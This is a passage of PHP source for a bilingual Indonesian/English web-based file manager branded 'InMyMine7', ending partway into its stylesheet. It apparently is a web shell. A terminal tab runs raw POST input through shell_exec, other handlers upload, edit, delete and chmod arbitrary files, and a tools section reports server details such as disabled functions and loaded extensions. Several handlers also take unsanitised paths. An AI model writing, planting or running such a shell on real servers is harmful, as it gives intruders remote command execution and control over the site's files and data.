        'txt'=>['fa-solid fa-file-lines','#90a4ae'],
        'log'=>['fa-solid fa-scroll','#78909c'],
        'sh' =>['fa-solid fa-terminal','#66bb6a'],
        'py' =>['fa-brands fa-python','#3572a5'],
        'env'=>['fa-solid fa-lock','#ffca28'],
    ];
    if(isset($m[$ext]))return $m[$ext];
    return ['fa-solid fa-file','#607d8b'];
}

function breadcrumb_parts_full($current_path, $root_dir) {
    if (!$current_path) return [];
    $current_path = rtrim(str_replace('\\', '/', (string)$current_path), '/');
    $is_windows = (DIRECTORY_SEPARATOR === '\\');
    $parts  = array_values(array_filter(explode('/', $current_path)));
    $crumbs = [];
    $built  = '';
    foreach ($parts as $i => $seg) {
        if ($is_windows && $i === 0) {
            $built = $seg;
        } else {
            $built .= '/' . $seg;
        }
        $realBuilt = realpath($built);
        if ($realBuilt !== false && $realBuilt !== null && $realBuilt !== '') {
            $normalizedPath = str_replace('\\', '/', $realBuilt);
            $clickable = is_dir($realBuilt);
        } else {
            $normalizedPath = $built;
            $clickable = false;
        }
        $crumbs[] = [
            'label'     => $seg,
            'path'      => $normalizedPath,
            'clickable' => $clickable,
        ];
    }
    return $crumbs;
}

// FIX: redir selalu membawa lang parameter
function redir($dir,$type,$msg,$extra=''){
    global $lang;
    $url = "?dir=".urlencode((string)$dir)."&t_type=".urlencode($type)."&t_msg=".urlencode($msg)."&lang=".$lang.$extra;
    header("Location: $url");
    exit;
}

$active_tab = isset($_GET['tab']) ? $_GET['tab'] : 'files';
// FIX: tab_param dan lang_param selalu disertakan di semua redirect
$tab_param  = '&tab='.urlencode($active_tab);
$lang_param = '&lang='.$lang;

// ── ZIP EXTRACT ── FIX: Gunakan path absolut + validasi lebih ketat
if(isset($_POST['extract_zip'])){
    $fname = basename($_POST['zip_file'] ?? '');
    if(!$fname) redir($current_dir,'error',($lang==='id'?"Nama file tidak valid.":"Invalid file name."),$tab_param.$lang_param);
    $src = $current_dir.'/'.$fname;
    if(!file_exists($src)) redir($current_dir,'error',($lang==='id'?"File zip tidak ditemukan: $fname":"ZIP file not found: $fname"),$tab_param.$lang_param);
    if(!class_exists('ZipArchive')) redir($current_dir,'error',($lang==='id'?"ZipArchive tidak tersedia.":"ZipArchive not available."),$tab_param.$lang_param);
    $zip = new ZipArchive();
    $res = $zip->open($src);
    if($res === TRUE){
        $base = pathinfo($fname, PATHINFO_FILENAME);
        $dest = $current_dir.'/'.$base;
        // Jika folder sudah ada, buat nama unik
        if(is_dir($dest)) $dest = $current_dir.'/'.$base.'_'.time();
        @mkdir($dest, 0755, true);
        $zip->extractTo($dest);
        $zip->close();
        redir($current_dir,'success',($lang==='id'?"\"$fname\" berhasil diekstrak ke folder \"".basename($dest)."\"":"\"$fname\" extracted to folder \"".basename($dest)."\" successfully."),'&tab=files'.$lang_param);
    } else {
        $errMsg = ($lang==='id'?"Gagal membuka ZIP (kode: $res).":"Failed to open ZIP (code: $res).");
        redir($current_dir,'error',$errMsg,'&tab=files'.$lang_param);
    }
}

// ── CREATE ZIP ── FIX: Gunakan path absolut dan validasi file
if(isset($_POST['create_zip'])){
    $fname = trim($_POST['zip_name'] ?? '');
    if(!$fname) redir($current_dir,'error',($lang==='id'?"Nama zip tidak boleh kosong.":"ZIP name cannot be empty."),'&tab=zip'.$lang_param);
    if(!str_ends_with(strtolower($fname),'.zip')) $fname .= '.zip';
    // Amankan nama file
    $fname = basename($fname);
    $files = isset($_POST['zip_files']) ? (array)$_POST['zip_files'] : [];
    if(empty($files)) redir($current_dir,'error',($lang==='id'?"Pilih minimal satu file.":"Select at least one file."),'&tab=zip'.$lang_param);
    if(!class_exists('ZipArchive')) redir($current_dir,'error',($lang==='id'?"ZipArchive tidak tersedia.":"ZipArchive not available."),'&tab=zip'.$lang_param);
    $zip = new ZipArchive();
    $zippath = $current_dir.'/'.$fname;
    $res = $zip->open($zippath, ZipArchive::CREATE | ZipArchive::OVERWRITE);
    if($res === TRUE){
        $added = 0;
        foreach($files as $f){
            $fp = $current_dir.'/'.basename($f);
            // FIX: Validasi file benar-benar ada sebelum ditambahkan
            if(file_exists($fp) && is_file($fp)){
                $zip->addFile($fp, basename($fp));
                $added++;
            }
        }
        $zip->close();
        if($added > 0){
            redir($current_dir,'success',($lang==='id'?"ZIP \"$fname\" berhasil dibuat ($added file).":"ZIP \"$fname\" created successfully ($added files)."),'&tab=zip'.$lang_param);
        } else {
            @unlink($zippath);
            redir($current_dir,'error',($lang==='id'?"Tidak ada file valid yang bisa di-zip.":"No valid files found to ZIP."),'&tab=zip'.$lang_param);
        }
    } else {
        redir($current_dir,'error',($lang==='id'?"Gagal membuat ZIP (kode: $res). Periksa permission folder.":"Failed to create ZIP (code: $res). Check folder permissions."),'&tab=zip'.$lang_param);
    }
}

// ── COPY FILE ──
if(isset($_POST['copy_file'])){
    $src = basename($_POST['copy_src'] ?? '');
    $dst = trim($_POST['copy_dest'] ?? '');
    $srcpath = realpath($current_dir.'/'.$src);
    if(!$dst) redir($current_dir,'error',($lang==='id'?"Tujuan tidak boleh kosong.":"Destination cannot be empty."),$tab_param.$lang_param);
    $dstpath = realpath($dst);
    if(!$dstpath || !is_dir($dstpath)) redir($current_dir,'error',($lang==='id'?"Folder tujuan tidak ditemukan.":"Destination folder not found."),$tab_param.$lang_param);
    if($srcpath && is_file($srcpath)){
        if(copy($srcpath, $dstpath.'/'.$src)) redir($current_dir,'success',($lang==='id'?"\"$src\" berhasil disalin.":"\"$src\" copied successfully."),$tab_param.$lang_param);
        else redir($current_dir,'error',($lang==='id'?"Gagal menyalin file.":"Failed to copy file."),$tab_param.$lang_param);
    }
}

// ── MOVE FILE ──
if(isset($_POST['move_file'])){
    $src = basename($_POST['move_src'] ?? '');
    $dst = trim($_POST['move_dest'] ?? '');
    $srcpath = realpath($current_dir.'/'.$src);
    if(!$dst) redir($current_dir,'error',($lang==='id'?"Tujuan tidak boleh kosong.":"Destination cannot be empty."),$tab_param.$lang_param);
    $dstpath = realpath($dst);
    if(!$dstpath || !is_dir($dstpath)) redir($current_dir,'error',($lang==='id'?"Folder tujuan tidak ditemukan.":"Destination folder not found."),$tab_param.$lang_param);
    if($srcpath && is_file($srcpath)){
        if(rename($srcpath, $dstpath.'/'.$src)) redir($current_dir,'success',($lang==='id'?"\"$src\" berhasil dipindah.":"\"$src\" moved successfully."),$tab_param.$lang_param);
        else redir($current_dir,'error',($lang==='id'?"Gagal memindahkan file.":"Failed to move file."),$tab_param.$lang_param);
    }
}

// ── DELETE FILE ──
if(isset($_GET['delete'])){
    $name=basename($_GET['delete']);
    $target=realpath($current_dir.'/'.$name);
    if($target&&is_file($target)&&unlink($target))
        redir($current_dir,'success',($lang==='id'?"File \"$name\" berhasil dihapus.":"File \"$name\" deleted successfully."),'&tab=files'.$lang_param);
    else
        redir($current_dir,'error',($lang==='id'?"Gagal menghapus \"$name\".":"Failed to delete \"$name\"."),'&tab=files'.$lang_param);
}

// ── DELETE FOLDER ──
if(isset($_GET['delete_dir'])){
    $name=basename($_GET['delete_dir']);
    $target=realpath($current_dir.'/'.$name);
    if($target&&is_dir($target)){
        function rmdir_recursive($dir){
            if(!is_dir($dir))return false;
            $items=scandir($dir);
            foreach($items as $item){
                if($item==='.'||$item==='..') continue;
                $path=$dir.'/'.$item;
                if(is_dir($path)) rmdir_recursive($path); else @unlink($path);
            }
            return @rmdir($dir);
        }
        if(rmdir_recursive($target))
            redir($current_dir,'success',($lang==='id'?"Folder \"$name\" berhasil dihapus.":"Folder \"$name\" deleted successfully."),'&tab=files'.$lang_param);
        else
            redir($current_dir,'error',($lang==='id'?"Gagal menghapus folder.":"Failed to delete folder."),'&tab=files'.$lang_param);
    } else redir($current_dir,'error',($lang==='id'?"Folder tidak ditemukan.":"Folder not found."),'&tab=files'.$lang_param);
}

// ── DOWNLOAD ──
if(isset($_GET['download'])){
    $target=realpath($current_dir.'/'.basename($_GET['download']));
    if($target&&is_file($target)){
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($target).'"');
        header('Content-Length: '.filesize($target));
        readfile($target);exit;
    }
    redir($current_dir,'error',($lang==='id'?"File tidak ditemukan.":"File not found."),'&tab=files'.$lang_param);
}

// ── DOWNLOAD FOLDER AS ZIP ──
if(isset($_GET['download_dir'])){
    $name = basename($_GET['download_dir']);
    $target = realpath($current_dir.'/'.$name);
    if($target && is_dir($target) && class_exists('ZipArchive')){
        $tmpzip = sys_get_temp_dir().'/'.uniqid('dir_').$name.'.zip';
        $zip = new ZipArchive();
        if($zip->open($tmpzip, ZipArchive::CREATE) === TRUE){
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target), RecursiveIteratorIterator::LEAVES_ONLY);
            foreach($files as $file){
                if(!$file->isDir()){
                    $filePath = $file->getRealPath();
                    $relativePath = $name.'/'.substr($filePath, strlen($target)+1);
                    $zip->addFile($filePath, $relativePath);
                }
            }
            $zip->close();
            header('Content-Description: File Transfer');
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="'.$name.'.zip"');
            header('Content-Length: '.filesize($tmpzip));
            readfile($tmpzip);
            @unlink($tmpzip);exit;
        }
    }
    redir($current_dir,'error',($lang==='id'?"Gagal membuat zip dari folder.":"Failed to create folder ZIP."),'&tab=files'.$lang_param);
}

// ── RENAME ──
if(isset($_POST['rename_file'])){
    $old=trim($_POST['old_name']??'');$new=trim($_POST['new_name']??'');
    if($new&&@rename($current_dir.'/'.$old,$current_dir.'/'.$new))
        redir($current_dir,'success',($lang==='id'?"\"$old\" → \"$new\" berhasil direname.":"\"$old\" → \"$new\" renamed successfully."),'&tab=files'.$lang_param);
    else
        redir($current_dir,'error',($lang==='id'?"Gagal rename \"$old\".":"Failed to rename \"$old\"."),'&tab=files'.$lang_param);
}

// ── UPLOAD ──
if(isset($_POST['upload'])){
    $success=0;$fail=0;
    if(isset($_FILES['files'])&&is_array($_FILES['files']['name'])){
        for($i=0;$i<count($_FILES['files']['name']);$i++){
            $fname=basename($_FILES['files']['name'][$i]);
            $target=$current_dir.'/'.$fname;
            if($fname&&move_uploaded_file($_FILES['files']['tmp_name'][$i],$target)) $success++; else $fail++;
        }
    }
    if($success>0&&$fail==0)
        redir($current_dir,'success',($lang==='id'?"$success file berhasil diupload.":"$success file(s) uploaded successfully."),'&tab=upload'.$lang_param);
    elseif($success>0)
        redir($current_dir,'success',($lang==='id'?"$success berhasil, $fail gagal.":"$success uploaded, $fail failed."),'&tab=upload'.$lang_param);
    else
        redir($current_dir,'error',($lang==='id'?"Gagal upload file.":"Failed to upload file."),'&tab=upload'.$lang_param);
}

// ── SAVE FILE ──
if(isset($_POST['save_file'])){
    $fname=$_POST['file_name']??'';
    $bytes=file_put_contents($current_dir.'/'.$fname,$_POST['file_content']??'');
    if($bytes!==false)
        redir($current_dir,'success',($lang==='id'?"\"$fname\" disimpan ($bytes bytes).":"\"$fname\" saved ($bytes bytes)."),"&tab=files&edit=".urlencode($fname).$lang_param);
    else
        redir($current_dir,'error',($lang==='id'?"Gagal menyimpan.":"Failed to save."),"&tab=files&edit=".urlencode($fname).$lang_param);
}

// ── CREATE FILE ──
if(isset($_POST['create_file'])){
    $fname=trim($_POST['new_file_name']??'');$path=$current_dir.'/'.$fname;
    if(!$fname) redir($current_dir,'error',($lang==='id'?"Nama tidak boleh kosong.":"Name cannot be empty."),'&tab=create'.$lang_param);
    elseif(file_exists($path)) redir($current_dir,'error',($lang==='id'?"File \"$fname\" sudah ada.":"File \"$fname\" already exists."),'&tab=create'.$lang_param);
    elseif(file_put_contents($path,'')!==false) redir($current_dir,'success',($lang==='id'?"File \"$fname\" berhasil dibuat.":"File \"$fname\" created successfully."),'&tab=create'.$lang_param);
    else redir($current_dir,'error',($lang==='id'?"Gagal membuat file.":"Failed to create file."),'&tab=create'.$lang_param);
}

// ── CREATE FOLDER ──
if(isset($_POST['create_folder'])){
    $fname=trim($_POST['new_folder_name']??'');$path=$current_dir.'/'.$fname;
    if(!$fname) redir($current_dir,'error',($lang==='id'?"Nama tidak boleh kosong.":"Name cannot be empty."),'&tab=create'.$lang_param);
    elseif(file_exists($path)) redir($current_dir,'error',($lang==='id'?"Folder \"$fname\" sudah ada.":"Folder \"$fname\" already exists."),'&tab=create'.$lang_param);
    elseif(@mkdir($path,0755,false)) redir($current_dir,'success',($lang==='id'?"Folder \"$fname\" berhasil dibuat.":"Folder \"$fname\" created successfully."),'&tab=create'.$lang_param);
    else redir($current_dir,'error',($lang==='id'?"Gagal membuat folder.":"Failed to create folder."),'&tab=create'.$lang_param);
}

// ── DUPLICATE FILE ──
if(isset($_GET['duplicate'])){
    $name=basename($_GET['duplicate']);$src=realpath($current_dir.'/'.$name);
    if($src&&is_file($src)){
        $pathinfo=pathinfo($name);
        $new_name=$pathinfo['filename'].'_copy.'.(isset($pathinfo['extension'])?$pathinfo['extension']:'');
        $new_path=$current_dir.'/'.$new_name;
        if(copy($src,$new_path))
            redir($current_dir,'success',($lang==='id'?"\"$name\" → \"$new_name\" berhasil diduplikasi.":"\"$name\" → \"$new_name\" duplicated."),'&tab=files'.$lang_param);
        else
            redir($current_dir,'error',($lang==='id'?"Gagal duplikasi.":"Failed to duplicate."),'&tab=files'.$lang_param);
    }
}

// ── CHANGE PERMISSIONS ──
if(isset($_POST['change_perms'])){
    $fname=$_POST['perm_file']??'';$perms=octdec($_POST['permissions']??'644');
    $path=$current_dir.'/'.$fname;
    if(file_exists($path)){
        if(@chmod($path,$perms))
            redir($current_dir,'success',($lang==='id'?"Permissions \"$fname\" → ".decoct($perms).".":"Permissions for \"$fname\" set to ".decoct($perms)."."),'&tab=files'.$lang_param);
        else
            redir($current_dir,'error',($lang==='id'?"Gagal ubah permissions.":"Failed to change permissions."),'&tab=files'.$lang_param);
    }
}

// ── EXECUTE COMMAND ──
$cmd_output = '';
$cmd_input_val = '';
if(isset($_POST['run_cmd'])){
    $cmd = trim($_POST['cmd_input']??'');
    $cmd_input_val = $cmd;
    if($cmd){
        $disabled = (!function_exists('shell_exec') || in_array('shell_exec', array_map('trim', explode(',', ini_get('disable_functions')))));
        if($disabled){
            $cmd_output = '[shell_exec DISABLED on this server]';
        } else {
            $result = shell_exec('cd '.escapeshellarg($current_dir).' && '.$cmd.' 2>&1');
            $cmd_output = ($result === null) ? '[No output / Command returned null]' : $result;
        }
    }
    $active_tab = 'terminal';
}

// ── SEARCH FILES ──
$search_query='';
$search_results=[];
if(isset($_POST['search_files'])){
    $search_query=trim($_POST['search_query']??'');
    $active_tab = 'search';
    if($search_query){
        function search_recursive($dir,$pattern){
            $results=[];$items=@scandir($dir);
            if(!$items)return $results;
            foreach($items as $item){
                if($item==='.'||$item==='..') continue;
                $path=$dir.'/'.$item;
                if(stripos($item,$pattern)!==false)
                    $results[]=['name'=>$item,'path'=>$path,'is_dir'=>is_dir($path),'size'=>is_file($path)?filesize($path):0];
                if(is_dir($path)) $results=array_merge($results,search_recursive($path,$pattern));
            }
            return $results;
        }
        $search_results=search_recursive($current_dir,$search_query);
    }
}

// ── VIEW MODE ──
$view_mode = isset($_COOKIE['view_mode']) ? $_COOKIE['view_mode'] : 'list';
if(isset($_GET['view'])){
    $view_mode = $_GET['view'];
    setcookie('view_mode', $view_mode, time()+86400*30, '/');
}

// ── SORT ──
$sort_by  = isset($_GET['sort']) ? $_GET['sort'] : 'name';
$sort_dir = isset($_GET['sdir']) ? $_GET['sdir'] : 'asc';

// ── Edit file? ──
$edit_file = isset($_GET['edit']) ? $_GET['edit'] : null;
$edit_content = '';$edit_size = '';$edit_ext = '';$edit_mtime = '';
if($edit_file){
    $fp = $current_dir.'/'.$edit_file;
    if(is_file($fp)){
        $edit_content = file_get_contents($fp);
        $edit_size    = fmt_size(filesize($fp));
        $edit_ext     = strtolower(pathinfo($fp, PATHINFO_EXTENSION));
        $edit_mtime   = date('d M Y H:i', filemtime($fp));
        $active_tab   = 'files';
    } else { $edit_file = null; }
}

// ── Rename? ──
$rename_file = isset($_GET['rename']) ? $_GET['rename'] : null;

// ── Stats ──
$all_items = @scandir($current_dir) ?: [];
$all=array_filter($all_items,fn($f)=>$f!='.'&&$f!='..');
$fc_count=count(array_filter($all,fn($f)=>is_file($current_dir.'/'.$f)));
$dc_count=count(array_filter($all,fn($f)=>is_dir($current_dir.'/'.$f)));

$disk_free=function_exists('disk_free_space')?fmt_size(disk_free_space($current_dir)):'N/A';
$disk_total=function_exists('disk_total_space')?fmt_size(disk_total_space($current_dir)):'N/A';
$disk_used=function_exists('disk_free_space')&&function_exists('disk_total_space')?fmt_size(disk_total_space($current_dir)-disk_free_space($current_dir)):'N/A';

$eDir    = urlencode((string)$current_dir);
$eRoot   = urlencode((string)$root_dir);
$is_root = ($current_dir === $root_dir);
$parent_dir = dirname($current_dir);
$eParent = urlencode((string)$parent_dir);

$crumbs = breadcrumb_parts_full($current_dir, $root_dir);

function sort_link($col,$label,$icon,$current_sort,$current_dir_str,$current_sort_dir,$cur_tab='files',$lp=''){
    $nd=($current_sort===$col&&$current_sort_dir==='asc')?'desc':'asc';
    $arrow=($current_sort===$col)?($current_sort_dir==='asc'?' ↑':' ↓'):'';
    $eD=urlencode($current_dir_str);
    return "<a href='?dir={$eD}&sort={$col}&sdir={$nd}&tab=".urlencode($cur_tab)."$lp' style='color:var(--mute);text-decoration:none;font-size:.6rem;font-weight:700;text-transform:uppercase;letter-spacing:.16em'><i class='{$icon}'></i> {$label}{$arrow}</a>";
}

function listDirectory($dir,$sort_by='name',$sort_dir='asc',$view_mode='list',$active_tab='files',$t=[],$lp=''){
    $items=@scandir($dir);
    if(!$items){
        echo '<tr><td colspan="6" class="empty-td"><div class="empty-state"><i class="fa-solid fa-circle-exclamation"></i><span>'.htmlspecialchars($t['cannot_read']).'</span></div></td></tr>';
        return;
    }
    $dirs_arr=$files_arr=[];
    foreach($items as $f){
        if($f==='.'||$f==='..') continue;
        $fp=$dir.'/'.$f;
        $info=['name'=>$f,'mtime'=>@filemtime($fp),'perms'=>substr(sprintf('%o',@fileperms($fp)),-3),'size'=>is_file($fp)?@filesize($fp):0];
        is_dir($fp)?$dirs_arr[]=$info:$files_arr[]=$info;
    }
    $cmp=function($a,$b)use($sort_by,$sort_dir){
        $v=match($sort_by){
            'size' =>$a['size']<=>$b['size'],
            'mtime'=>$a['mtime']<=>$b['mtime'],
            'perms'=>strcmp($a['perms'],$b['perms']),
            default=>strcasecmp($a['name'],$b['name']),
        };
        return $sort_dir==='desc'?-$v:$v;
    };
    usort($dirs_arr,$cmp);
    usort($files_arr,$cmp);

    if(!$dirs_arr&&!$files_arr){
        echo '<tr><td colspan="6" class="empty-td"><div class="empty-state"><i class="fa-solid fa-box-open"></i><span>'.htmlspecialchars($t['empty_dir']).'</span></div></td></tr>';
        return;
    }

    $eD=urlencode($dir);

    // ── GRID VIEW ──
    if($view_mode==='grid'){
        echo '<tr><td colspan="6" style="padding:0"><div class="grid-view">';
        foreach($dirs_arr as $d){
            $eD2  = urlencode($dir.'/'.$d['name']);
            $eFH  = htmlspecialchars($d['name']);
            $eFU  = urlencode($d['name']);
            echo "<div class='grid-item' onclick=\"location='?dir={$eD2}&tab=files{$lp}'\">
              <div class='grid-icon'><i class='fa-solid fa-folder' style='color:#ffd166;font-size:2rem'></i></div>
              <div class='grid-name' title='{$eFH}'>{$eFH}</div>
              <div class='grid-meta'>DIR</div>
              <div class='grid-actions' onclick='event.stopPropagation()'>
                <a href='?dir={$eD2}&tab=files{$lp}' class='ab ab-open' title='{$t['open']}'><i class='fa-solid fa-folder-open'></i></a>
                <a href='?dir={$eD}&rename={$eFU}&tab=files{$lp}' class='ab ab-rename' title='{$t['rename']}'><i class='fa-solid fa-pen'></i></a>
                <a href='?dir={$eD}&download_dir={$eFU}{$lp}' class='ab ab-dl' title='{$t['dl_zip']}'><i class='fa-solid fa-file-zipper'></i></a>
                <a href='javascript:void(0)' class='ab ab-del' title='{$t['delete']}' onclick=\"confirmDelete('folder','{$eFH}','?dir={$eD}&delete_dir={$eFU}{$lp}')\"><i class='fa-solid fa-trash'></i></a>
              </div>
            </div>";
        }
        foreach($files_arr as $f){
            [$fic,$fcol] = fa_icon($f['name']);
            $eFH  = htmlspecialchars($f['name']);
            $eFU  = urlencode($f['name']);
            $sstr = fmt_size($f['size']);
            $isZip = in_array(strtolower(pathinfo($f['name'],PATHINFO_EXTENSION)),['zip','rar','tar','gz']);
            $extractBtn = $isZip ? "<a href='javascript:void(0)' class='ab ab-extract' title='{$t['extract']}' onclick=\"openExtractModal('{$eFH}');event.stopPropagation()\"><i class='fa-solid fa-box-archive'></i></a>" : "";
            echo "<div class='grid-item'>
              <div class='grid-icon'><i class='{$fic}' style='color:{$fcol};font-size:2rem'></i></div>
              <div class='grid-name' title='{$eFH}'>{$eFH}</div>
              <div class='grid-meta'>{$sstr}</div>
              <div class='grid-actions'>
                <a href='?dir={$eD}&edit={$eFU}&tab=files{$lp}' class='ab ab-edit' title='{$t['edit']}'><i class='fa-solid fa-code'></i></a>
                <a href='?dir={$eD}&rename={$eFU}&tab=files{$lp}' class='ab ab-rename' title='{$t['rename']}'><i class='fa-solid fa-pen'></i></a>
                <a href='?dir={$eD}&download={$eFU}{$lp}' class='ab ab-dl' title='{$t['download']}'><i class='fa-solid fa-download'></i></a>
                {$extractBtn}
                <a href='javascript:void(0)' class='ab ab-del' title='{$t['delete']}' onclick=\"confirmDelete('file','{$eFH}','?dir={$eD}&delete={$eFU}{$lp}')\"><i class='fa-solid fa-trash'></i></a>
              </div>
            </div>";
        }
        echo '</div></td></tr>';
        return;
    }

    // ── LIST VIEW ──
    foreach($dirs_arr as $d){
        $eD2  = urlencode($dir.'/'.$d['name']);
        $eFH  = htmlspecialchars($d['name']);
        $eFU  = urlencode($d['name']);
        $mtime= date('d M Y  H:i',$d['mtime']);
        echo "<tr class='fr selectable-row' data-name='{$eFH}' onclick=\"location='?dir={$eD2}&tab=files{$lp}'\" style='cursor:pointer'>
          <td class='cb-cell'><input type='checkbox' class='row-cb' value='{$eFH}' onclick='event.stopPropagation()'></td>
          <td class='nc'><span class='fi-wrap'><i class='fa-solid fa-folder fi-folder'></i></span><span class='fn'>{$eFH}</span></td>
          <td><span class='badge-dir'><i class='fa-solid fa-folder-open'></i> DIR</span></td>
          <td class='mtime'>{$mtime}</td>
          <td class='perms'>{$d['perms']}</td>
          <td class='ac' onclick='event.stopPropagation()'>
            <a href='?dir={$eD2}&tab=files{$lp}' class='ab ab-open' title='{$t['open']}'><i class='fa-solid fa-folder-open'></i></a>
            <a href='?dir={$eD}&rename={$eFU}&tab=files{$lp}' class='ab ab-rename' title='{$t['rename']}'><i class='fa-solid fa-pen'></i></a>
            <a href='?dir={$eD}&download_dir={$eFU}{$lp}' class='ab ab-dl' title='{$t['dl_zip']}'><i class='fa-solid fa-file-zipper'></i></a>
            <a href='javascript:void(0)' class='ab ab-del' title='{$t['delete']}' onclick=\"confirmDelete('folder','{$eFH}','?dir={$eD}&delete_dir={$eFU}{$lp}')\"><i class='fa-solid fa-trash'></i></a>
          </td>
        </tr>";
    }

    foreach($files_arr as $f){
        $sstr = fmt_size($f['size']);
        [$fic,$fcol] = fa_icon($f['name']);
        $eFH  = htmlspecialchars($f['name']);
        $eFU  = urlencode($f['name']);
        $mtime= date('d M Y  H:i',$f['mtime']);
        $isZip = in_array(strtolower(pathinfo($f['name'],PATHINFO_EXTENSION)),['zip','rar','tar','gz']);
        $extractBtn = $isZip
            ? "<a href='javascript:void(0)' class='ab ab-extract' title='{$t['extract']}' onclick=\"openExtractModal('{$eFH}');return false\"><i class='fa-solid fa-box-archive'></i></a>"
            : "";
        echo "<tr class='fr selectable-row' data-name='{$eFH}'>
          <td class='cb-cell'><input type='checkbox' class='row-cb' value='{$eFH}' onclick='event.stopPropagation()'></td>
          <td class='nc'><span class='fi-wrap'><i class='{$fic} fi-file' style='color:{$fcol}'></i></span><span class='fn'>{$eFH}</span></td>
          <td><span class='fsize'>{$sstr}</span></td>
          <td class='mtime'>{$mtime}</td>
          <td class='perms'><a href='#' onclick=\"openPermModal('{$eFH}','{$f['perms']}');return false\" style='color:var(--mute);text-decoration:none'>{$f['perms']}</a></td>
          <td class='ac'>
            <a href='?dir={$eD}&edit={$eFU}&tab=files{$lp}' class='ab ab-edit' title='{$t['edit']}'><i class='fa-solid fa-code'></i></a>
            <a href='?dir={$eD}&rename={$eFU}&tab=files{$lp}' class='ab ab-rename' title='{$t['rename']}'><i class='fa-solid fa-pen'></i></a>
            <a href='?dir={$eD}&duplicate={$eFU}{$lp}' class='ab ab-copy' title='{$t['duplicate']}'><i class='fa-solid fa-copy'></i></a>
            <a href='?dir={$eD}&download={$eFU}{$lp}' class='ab ab-dl' title='{$t['download']}'><i class='fa-solid fa-download'></i></a>
            <a href='javascript:void(0)' class='ab ab-zip' title='{$t['copymove']}' onclick=\"openCopyMoveModal('{$eFH}');return false\"><i class='fa-solid fa-arrows-up-down-left-right'></i></a>
            {$extractBtn}
            <a href='javascript:void(0)' class='ab ab-del' title='{$t['delete']}' onclick=\"confirmDelete('file','{$eFH}','?dir={$eD}&delete={$eFU}{$lp}')\"><i class='fa-solid fa-trash'></i></a>
          </td>
        </tr>";
    }
}

$lp = '&lang='.$lang;

$js_current_dir = addslashes($current_dir);
$js_root_dir    = addslashes($root_dir);

// ── SYSTEM INFO for Tools ──
function get_sys_info(){
    $info = [];
    $info['php_version']    = PHP_VERSION;
    $info['php_sapi']       = PHP_SAPI;
    $info['os']             = php_uname();
    $info['server_software']= $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
    $info['max_upload']     = ini_get('upload_max_filesize');
    $info['max_post']       = ini_get('post_max_size');
    $info['max_exec']       = ini_get('max_execution_time').'s';
    $info['memory_limit']   = ini_get('memory_limit');
    $info['extensions']     = implode(', ', get_loaded_extensions());
    $info['disabled_funcs'] = ini_get('disable_functions') ?: 'none';
    $info['session_save']   = ini_get('session.save_path') ?: 'default';
    $info['timezone']       = date_default_timezone_get();
    $info['curl']           = function_exists('curl_version') ? (curl_version()['version'] ?? 'yes') : 'N/A';
    $info['gd']             = function_exists('gd_info') ? (gd_info()['GD Version'] ?? 'yes') : 'N/A';
    $info['zip']            = class_exists('ZipArchive') ? 'Available' : 'Not available';
    $info['pdo']            = class_exists('PDO') ? implode(', ', PDO::getAvailableDrivers()) : 'N/A';
    $info['opcache']        = function_exists('opcache_get_status') ? 'Available' : 'N/A';
    return $info;
}
$sys_info = get_sys_info();
?>
<!DOCTYPE html>
<html lang="<?=$lang?>">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?=htmlspecialchars($t['title'])?> — InMyMine7</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,300&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
:root{
  --bg:#080810;--s1:#0d0d1a;--s2:#111124;--s3:#161630;--s4:#1c1c3a;
  --b1:#1e1e3c;--b2:#272750;--b3:#353566;
  --v:#7c5cfc;--v2:#a080ff;--v3:#c4aaff;
  --c:#00f5c4;--c2:#4fffd8;
  --pk:#ff4d8d;--pk2:#ff80aa;
  --y:#ffd166;--g:#39ff7e;--r:#ff3d6b;--o:#ff9800;
  --txt:#e0e0f0;--dim:#7070a0;--mute:#404068;--ghost:#22223a;
  --rad:14px;--rads:8px;--radp:5px;--tr:all .18s cubic-bezier(.4,0,.2,1);
}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html{scroll-behavior:smooth}
body{background:var(--bg);color:var(--txt);font-family:'DM Sans',sans-serif;min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased;}
.bg-layer{position:fixed;inset:0;pointer-events:none;z-index:0;}
.bg-layer::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 90% 60% at 5% -10%,rgba(124,92,252,.18) 0%,transparent 55%),radial-gradient(ellipse 70% 80% at 100% 110%,rgba(0,245,196,.11) 0%,transparent 55%),radial-gradient(ellipse 60% 50% at 60% 55%,rgba(255,77,141,.07) 0%,transparent 55%);}
.bg-grid{position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(124,92,252,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(124,92,252,.04) 1px,transparent 1px);background-size:40px 40px;}
.wrap{position:relative;z-index:1;max-width:1380px;margin:0 auto;padding:22px 20px 100px}
.hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:22px;padding-bottom:18px;border-bottom:1px solid var(--b1);flex-wrap:wrap;gap:12px;position:relative;}
.hdr::after{content:'';position:absolute;bottom:-1px;left:0;width:120px;height:1px;background:linear-gradient(90deg,var(--v),transparent);}
.brand-block{display:flex;align-items:center;gap:14px}
.brand-logo{width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,var(--v),var(--c));display:flex;align-items:center;justify-content:center;font-size:1.1rem;color:#fff;box-shadow:0 0 24px rgba(124,92,252,.5),0 0 48px rgba(124,92,252,.2);flex-shrink:0;}
.brand{font-family:'Fira Code',monospace;font-weight:700;font-size:clamp(1.1rem,3vw,1.6rem);letter-spacing:-.03em;background:linear-gradient(120deg,var(--v) 0%,var(--c) 50%,var(--pk) 100%);background-size:200% auto;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:shimmer 5s linear infinite;line-height:1;}
@keyframes shimmer{to{background-position:200% center}}
